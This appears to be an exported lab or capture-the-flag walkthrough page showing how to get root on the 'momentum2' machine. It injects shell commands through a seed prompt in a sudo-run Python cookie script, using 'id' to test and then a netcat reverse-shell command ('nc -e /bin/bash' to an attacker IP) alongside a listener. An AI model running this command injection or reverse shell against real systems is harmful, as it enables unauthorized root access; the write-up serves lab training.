<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>5. Privilege Escalation</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>5. Privilege Escalation</h1><br/><br /><strong>Getting root shell</strong><br /><br />1. Look at the “<code>athena</code>” user permissions.<br />	<div class="codebox"><div class="codebox">athena@momentum2:~<span style="color:#0057ae;font-weight:400">$sudo</span>&nbsp;-l</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/539-1.png" alt="images/539-1.png" /></a><br />	<br />	So, you ocan run the “/usr/bin/python3” and “<code>/home/team-tasks/cookie-gen.py</code>” files.<br /><br />2. Let&#39;s see what this file is.<br />	<div class="codebox"><div class="codebox">athena@momentum2:~<span style="color:#0057ae;font-weight:400">$cat</span>&nbsp;/home/team-tasks/cookie-gen.py<br /></div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/539-2.png" alt="images/539-2.png" /></a><br />	<br />	This program generate a cookie,<br />	<br />4. Thinkings as OS command injection is the the right way to exploit this vulnerability. Run the following code and enter “2;id;” as seed.<br />	<div class="codebox"><div class="codebox">athena@momentum2:~<span style="color:#0057ae;font-weight:400">$sudo</span>&nbsp;/usr/bin/python3&nbsp;/home/team-tasks/cookie-gen.py</div></div><br />	<br />	<span style="color:#ffa500;">Output:</span>			<br />	<a href=""><img src="images/539-3.png" alt="images/539-3.png" /></a><br />	<br />5. On your Kali Machine, open a connection with “netcat”.<br />	<div class="codebox"><div class="codebox"><span style="color:#0057ae;font-weight:400">$nc</span>&nbsp;-lvnp&nbsp;5555<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span>	<br />	<a href=""><img src="images/539-4.png" alt="images/539-4.png" /></a><br /><br />6. Run the code from point 4 but this time introduce the following seed: “2;nc -e /bin/bash 192.168.12.10 5555;”<br />	<div class="codebox"><div class="codebox">athena@momentum2:~<span style="color:#0057ae;font-weight:400">$sudo</span>&nbsp;/usr/bin/python3&nbsp;/home/team-tasks/cookie-gen.py</div></div><br /><br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/539-5.png" alt="images/539-5.png" /></a><br />	<br />	On your Kali Machine.<br />	<br />	<span style="color:#ffa500;">Output:</span>		<br />	<a href=""><img src="images/539-6.png" alt="images/539-6.png" /></a><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>